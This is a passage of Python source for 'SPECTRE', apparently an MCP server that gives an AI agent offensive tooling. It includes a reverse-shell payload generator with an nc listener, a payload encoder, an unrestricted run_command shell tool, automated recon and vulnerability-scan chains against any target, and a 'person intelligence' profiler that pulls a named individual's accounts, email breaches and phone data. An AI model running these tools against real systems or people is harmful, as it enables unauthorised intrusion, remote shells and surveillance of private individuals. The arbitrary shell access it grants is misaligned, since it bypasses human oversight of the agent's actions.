        return f"[ERROR] Unknown shell_type. Choose from: {', '.join(shells.keys())}"
    out = f"=== {shell_type.upper()} Reverse Shell (LHOST={lh} LPORT={lp}) ===\n\n"
    out += shells[shell_type]
    out += f"\n\n=== Start your listener ===\nnc -lvnp {lp}"
    return out


@mcp.tool()
def encode_payload(payload: str, encoding: str = "base64") -> str:
    """Encode a payload string. encoding: base64 | url | hex"""
    if err := require(payload): return err
    if encoding == "base64":
        return run_argv(["bash", "-c", f"printf '%s' '{san(payload)}' | base64"])
    elif encoding == "url":
        return run_argv(["bash", "-c", f"python3 -c \"import urllib.parse; print(urllib.parse.quote('{san(payload)}'))\""])
    elif encoding == "hex":
        return run_argv(["bash", "-c", f"printf '%s' '{san(payload)}' | xxd"])
    return "[ERROR] encoding must be: base64, url, or hex"


@mcp.tool()
def run_command(command: str) -> str:
    """Execute any arbitrary shell command inside the SPECTRE container.
    Full shell access — use responsibly."""
    if err := require(command): return err
    return run_argv(["bash", "-c", command], timeout=TIMEOUT)


# ═════════════════════════════════════════════════════════════════════════════
# GOD MODE — FULL TARGET PROFILES
# ═════════════════════════════════════════════════════════════════════════════

@mcp.tool()
def full_domain_profile(domain: str) -> str:
    """GOD MODE: Complete domain intelligence — runs 10 tools in sequence.
    Covers WHOIS, DNS, subdomains, certs, geo, ports, web tech, emails, archives, threat intel."""
    if err := require(domain): return err
    d = san(domain)
    sec = []

    def banner(title):
        sec.append(f"\n{'═'*62}\n  {title}\n{'═'*62}")

    sec.append("╔══════════════════════════════════════════════════════════════╗")
    sec.append(f"║  SPECTRE — FULL DOMAIN PROFILE: {d:<29}║")
    sec.append("╚══════════════════════════════════════════════════════════════╝")

    banner("[1/10] WHOIS")
    sec.append(run(f"whois {d} 2>/dev/null | head -25"))

    banner("[2/10] DNS RECORDS")
    sec.append(run(f"dig {d} ANY +noall +answer 2>/dev/null"))

    banner("[3/10] SUBDOMAIN ENUMERATION")
    sec.append(run(f"subfinder -d {d} -silent 2>/dev/null | head -30"))

    banner("[4/10] CERTIFICATE TRANSPARENCY")
    sec.append(run(
        f"curl -s 'https://crt.sh/?q=%.{d}&output=json' 2>/dev/null "
        r"| python3 -c \"import sys,json; certs=json.load(sys.stdin); "
        r"[print(c['name_value']) for c in certs[:20]]\" | sort -u"
    ))

    banner("[5/10] IP GEOLOCATION")
    ip_result = run(f"dig {d} A +short | head -1")
    ip = ip_result.strip()
    if ip:
        sec.append(run(f"curl -s 'https://ipinfo.io/{ip}/json' | python3 -m json.tool"))
    else:
        sec.append("(could not resolve IP)")

    banner("[6/10] OPEN PORTS")
    sec.append(run(f"sudo nmap -F --open -T4 {d} 2>/dev/null | grep -v '^#'"))

    banner("[7/10] WEB TECHNOLOGY")
    sec.append(run(f"whatweb -a 1 {d} 2>/dev/null"))

    banner("[8/10] EMAIL HARVEST")
    sec.append(run(
        f"theHarvester -d {d} -b bing,duckduckgo -l 50 2>/dev/null "
        r"| grep -E '@|\[\*\]' | head -20"
    ))

    banner("[9/10] ARCHIVED URLS")
    sec.append(run(
        f"curl -s 'http://web.archive.org/cdx/search/cdx?url=*.{d}/*"
        f"&output=text&fl=original&collapse=urlkey&limit=20' 2>/dev/null"
    ))

    banner("[10/10] THREAT INTELLIGENCE")
    if ip:
        sec.append(run(f"curl -s 'https://internetdb.shodan.io/{ip}' | python3 -m json.tool"))

    sec.append("\n╔══════════════════════════════════════════════════════════════╗")
    sec.append("║                    PROFILE COMPLETE                          ║")
    sec.append("╚══════════════════════════════════════════════════════════════╝")
    return "\n".join(sec)


@mcp.tool()
def full_person_profile(name: str = "", email: str = "",
                        username: str = "", phone: str = "") -> str:
    """GOD MODE: Complete person OSINT — social media, email, breaches, username, phone.
    Supply any combination of name / email / username / phone."""
    if not any([name, email, username, phone]):
        return "[ERROR] Provide at least one of: name, email, username, phone"

    sec = []
    sec.append("╔══════════════════════════════════════════════════════════════╗")
    sec.append("║         SPECTRE — PERSON INTELLIGENCE PROFILE                ║")
    sec.append("╚══════════════════════════════════════════════════════════════╝")

    if username:
        u = san(username)
        sec.append(f"\n[USERNAME HUNT: {u}]")
        sec.append(run(
            f"{PYTHON} -m sherlock {u} --print-found --timeout 10 2>/dev/null | head -30"
        ))

    if email:
        e = san(email)
        sec.append(f"\n[EMAIL RECON: {e}]")
        sec.append(run(f"{PYTHON} -m holehe {e} --only-used 2>/dev/null | head -20"))
        sec.append("\n[BREACH CHECK]")
        sec.append(run(f"{PYTHON} -m h8mail -t {e} 2>/dev/null | head -20"))

    if phone:
        p = san(phone)
        sec.append(f"\n[PHONE INTELLIGENCE: {p}]")
        sec.append(run(f"phoneinfoga scan -n '{p}' 2>/dev/null || echo 'phoneinfoga scan attempted'"))

    if name:
        n = san(name)
        sec.append(f"\n[SOCIAL SEARCH: {n}]")
        query = n.replace(" ", "+")
        sec.append(run(
            f"curl -sA 'Mozilla/5.0' 'https://www.google.com/search?q=\"{query}\"' 2>/dev/null "
            r"| python3 -c \"import sys,re; d=sys.stdin.read(); "
            r"links=re.findall(r'(?:href=\"/url\?q=)(https?://(?:linkedin|twitter|facebook|instagram)[^&\"]+)', d); "
            r"[print(u) for u in links[:10]]\""
        ))

    sec.append("\n╔══════════════════════════════════════════════════════════════╗")
    sec.append("║                  PERSON PROFILE COMPLETE                     ║")
    sec.append("╚══════════════════════════════════════════════════════════════╝")
    return "\n".join(sec)


@mcp.tool()
def full_pentest_recon(target: str) -> str:
    """GOD MODE: Complete pentest recon chain — ports, web, vulns, directories, SSL.
    Runs nmap → httpx → whatweb → nikto → nuclei → gobuster → sslscan in sequence."""
    if err := require(target): return err
    t = san(target)
    sec = []

    def banner(title):
        sec.append(f"\n{'═'*62}\n  {title}\n{'═'*62}")

    sec.append("╔══════════════════════════════════════════════════════════════╗")
    sec.append(f"║  SPECTRE — FULL PENTEST RECON: {t:<31}║")
    sec.append("╚══════════════════════════════════════════════════════════════╝")

    banner("[1/7] PORT SCAN")
    sec.append(run(f"sudo nmap -sV -sC -T4 --open {t}"))

    banner("[2/7] HTTP PROBE")
    sec.append(run(f"echo '{t}' | httpx -silent -title -status-code -tech-detect -server 2>/dev/null"))

    banner("[3/7] WEB FINGERPRINT")
    sec.append(run(f"whatweb -a 3 {t} 2>/dev/null"))

    banner("[4/7] VULNERABILITY SCAN (Nikto)")
    sec.append(run(f"nikto -h {t}", timeout=240))

    banner("[5/7] NUCLEI TEMPLATES")
    sec.append(run(f"nuclei -u {t} -severity critical,high -silent 2>/dev/null", timeout=300))

    banner("[6/7] DIRECTORY BRUTE FORCE")
    sec.append(run(
        f"gobuster dir -u {t} -w {WORDLIST} -x php,html,js,txt,bak,zip "
        f"-q --no-error 2>/dev/null",
        timeout=300,
    ))

    banner("[7/7] SSL/TLS ANALYSIS")
    sec.append(run(f"sslscan {t}", timeout=60))

    sec.append("\n╔══════════════════════════════════════════════════════════════╗")
    sec.append("║                  PENTEST RECON COMPLETE                      ║")
    sec.append("╚══════════════════════════════════════════════════════════════╝")
    return "\n".join(sec)


# ═════════════════════════════════════════════════════════════════════════════
# STATUS & DISCOVERY
# ═════════════════════════════════════════════════════════════════════════════

@mcp.tool()
def spectre_status() -> str:
    """Show SPECTRE server status, transport config, and all installed tool binaries."""
    bins = [
        "nmap", "masscan", "nikto", "sqlmap", "wpscan", "gobuster", "ffuf",
        "whatweb", "wafw00f", "sslscan", "testssl.sh", "subfinder", "amass",
        "theharvester", "recon-ng", "exiftool", "mat2", "sherlock", "holehe",
        "searchsploit", "nuclei", "httpx", "katana", "waybackurls", "gau",
        "naabu", "tlsx", "dnsx", "onesixtyone", "snmpwalk", "enum4linux",
        "hydra", "john", "hashcat", "aircrack-ng", "msfconsole", "msfvenom",
        "crackmapexec", "responder", "arpspoof", "tcpdump", "nc", "curl",
        "wget", "shodan", "scrapling",
    ]
    lines = [
        "╔══════════════════════════════════════════════════════════════╗",
        "║   SPECTRE — Surveillance, Penetration, Exploitation &        ║",
        "║              Cyber Threat Reconnaissance Engine              ║",
        "╚══════════════════════════════════════════════════════════════╝",
        f"\n  Transport : {TRANSPORT}",
        f"  Host      : {HOST}:{PORT}",
        f"  Timeout   : {TIMEOUT}s",
        f"  Python    : {PYTHON}",
        f"  Wordlist  : {WORDLIST}",
        "\n  API Keys Configured:",
        f"    SHODAN_API_KEY  : {'✔' if SHODAN_API_KEY else '✘ (uses InternetDB fallback)'}",
        f"    VT_API_KEY      : {'✔' if VT_API_KEY else '✘'}",
        f"    ABUSEIPDB_KEY   : {'✔' if ABUSEIPDB_KEY else '✘'}",
        f"    ETHERSCAN_KEY   : {'✔' if ETHERSCAN_KEY else '✘'}",
        "\n  Installed Binaries:",
    ]
    for b in sorted(bins):
        res = subprocess.run(["which", b], capture_output=True, text=True)
        status = "✔" if res.returncode == 0 else "✘"
        lines.append(f"    [{status}] {b}")

    lines += [
        "\n  Python Modules:",
        run(
            f"{PYTHON} -m pip list 2>/dev/null "
            "| grep -iE 'mcp|sherlock|holehe|h8mail|maigret|phoneinfoga|ghunt|"
            "socialscan|spiderfoot|onionsearch|osrframework|scrapling' "
            "| awk '{printf \"    %-30s %s\\n\",$1,$2}'"
        ),
        "\n╔══════════════════════════════════════════════════════════════╗",
        "║                  SPECTRE ONLINE — READY                      ║",
        "╚══════════════════════════════════════════════════════════════╝",
    ]
    return "\n".join(lines)


# ═════════════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    log.info("=" * 62)
    log.info("  SPECTRE MCP Server — starting up")
    log.info("  Transport : %s", TRANSPORT)
    log.info("  Address   : %s:%d", HOST, PORT)
    log.info("=" * 62)

    mcp.run(transport=TRANSPORT)
